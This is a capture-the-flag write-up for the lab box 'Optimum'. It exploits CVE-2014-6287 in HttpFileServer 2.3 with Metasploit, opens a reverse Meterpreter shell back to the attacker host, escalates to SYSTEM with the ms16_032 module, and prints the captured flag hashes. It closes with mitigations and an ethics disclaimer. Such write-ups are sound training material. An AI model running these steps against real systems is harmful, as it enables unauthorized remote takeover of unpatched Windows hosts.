---
title: "Foothold & Privilege Escalation — Optimum (HFS)"
date: 2025-10-12T12:00:00+11:00
draft: false
author: "Angus Dawson"
categories: ["HTB", "writeup", "pentest"]
tags: ["HFS", "CVE-2014-6287", "metasploit", "privilege-escalation"]
featured_image: "/images/optimum/optimum-ctf.png"
---


# Foothold & Privilege Escalation — Optimum (HTB-style)
**Author:** Angus Dawson  
**Target:** `10.129.245.40` (lab box)  
**Attacker:** `10.10.14.29` (Kali)

**Summary:** found HFS (HttpFileServer) on port 80, exploited CVE-2014-6287 with Metasploit to get a Meterpreter shell (user), then ran local post-exploit privesc modules and obtained Administrator to capture `root.txt`.

---

## TL;DR

- Recon: `nmap` showed `HttpFileServer httpd 2.3` on port 80.  
- Vulnerability: **CVE-2014-6287** — RCE in Rejetto HttpFileServer (HFS).  
- Exploit: `exploit/windows/http/rejetto_hfs_exec` (Metasploit) → Meterpreter → shell → `user.txt`.  
- Post-exploit: enumerated privesc modules, iterated until a working local exploit delivered SYSTEM, then captured `root.txt`.

---

## Reconnaissance

I started with a straightforward service scan to identify active services and versions:

```bash
sudo nmap -sC -sV -oN initial 10.129.245.40
```

Key output (trimmed):

```
80/tcp open  http  HttpFileServer httpd 2.3
```

![](./images/nmap.png)

Because HFS 2.3 was present, I searched for known vulnerabilities and found **CVE-2014-6287** (RCE against HFS).  

![](./images/found_CVE.png)

---

## Exploitation — Remote Code Execution (Foothold)

I used Metasploit’s `rejetto_hfs_exec` module to exploit the RCE.

**Metasploit commands (summary):**

```text
use exploit/windows/http/rejetto_hfs_exec
set RHOSTS 10.129.245.40
set LHOST 10.10.14.29
set LPORT 4444
run
```

(Options screenshot for reproducibility)

![](./images/set_options.png)

The module delivered a payload and opened a Meterpreter session. From Meterpreter, I dropped into a shell:

```
meterpreter > shell
C:\Users\kostas\Desktop> type user.txt
2e7bf8c5a4e47f73a710eed9035564bb
```

User flag captured:

![](./images/optimum/user-flag.png)

---

## Post-exploitation & Privilege Escalation

With a user shell, I moved to local privilege escalation. I inspected Metasploit’s `exploit/windows/local` options and used a mix of automatic suggestion + manual enumeration. A short list of candidate modules is shown below:

![](./images/optimum/privesc_modules.png)

I attempted multiple modules. Some aborted due to version/architecture mismatches (example failure):

![](./images/optimum/privesc-fail.png)

After iterating, a local token/handle-based module completed successfully and produced a SYSTEM shell (example success output):

![](./images/optimum/privesc-success.png)

From the elevated shell I read the Administrator/root flag:

```
C:\Users\Administrator\Desktop> type root.txt
288b316926a699a4f6e8e76b61f1dba9
```

![](./images/optimum/root-flag.png)

---

## Commands & Workflow (Appendix)

### Recon

```bash
sudo nmap -sC -sV -oN initial 10.129.245.40
```

### Exploit (Metasploit)

```text
msf6 > use exploit/windows/http/rejetto_hfs_exec
msf6 exploit(rejetto_hfs_exec) > set RHOSTS 10.129.245.40
msf6 exploit(rejetto_hfs_exec) > set LHOST 10.10.14.29
msf6 exploit(rejetto_hfs_exec) > set LPORT 4444
msf6 exploit(rejetto_hfs_exec) > run
```

Then in Meterpreter:

```text
meterpreter > shell
C:\Users\kostas\Desktop> type user.txt
```

### Post-exploit (example)

```text
msf6 > use exploit/windows/local/ms16_032_secondary_logon_handle_privesc
msf6 exploit(ms16_032_...) > set SESSION 1
msf6 exploit(ms16_032_...) > set LHOST 10.10.14.29
msf6 exploit(ms16_032_...) > run
```

> Tip: If a module aborts due to an unsupported OS/architecture, move on to additional modules or perform manual enumeration (services, scheduled tasks, drivers, installed software, unquoted service paths, weak ACLs).

---

## Lessons Learned

- **Check target OS/arch** before running local exploits; many local modules require specific Windows builds/bitness.  
- **Iterate**: privesc is rarely a single-hit step — try token manipulation, service misconfigurations, and weak permissions.  
- **Containment**: HFS is a risky service to expose publicly; patch or replace it.

---

## Mitigations & Recommendations

- **Patch** HttpFileServer or remove/replace with a maintained alternative.  
- **Network segmentation**: avoid exposing admin/file servers to untrusted networks.  
- **Least privilege**: ensure services run with minimal required privileges and fix file/service permissions.  
- **Monitoring**: create alerts for suspicious web requests and unexpected outbound connections.

---

## Gallery (process screenshots)

- Recon (nmap): `./images/optimum/nmap.png`  
- CVE lookup: `./images/optimum/found_CVE.png`  
- Metasploit exploit options: `./images/optimum/set_options.png`  
- Exploit / Meterpreter (foothold): `./images/optimum/foothold.png`  
- `user.txt` captured: `./images/optimum/user-flag.png`  
- Privesc candidates: `./images/optimum/privesc_modules.png`  
- Example privesc failure: `./images/optimum/privesc-fail.png`  
- Successful escalation output: `./images/optimum/privesc-success.png`  
- `root.txt` captured: `./images/optimum/root-flag.png`

---

## Attribution & Ethics

This writeup documents testing performed on a lab/CTF box. Do not run these techniques against systems you do not own or do not have explicit permission to test. Always follow legal and ethical guidelines.

---



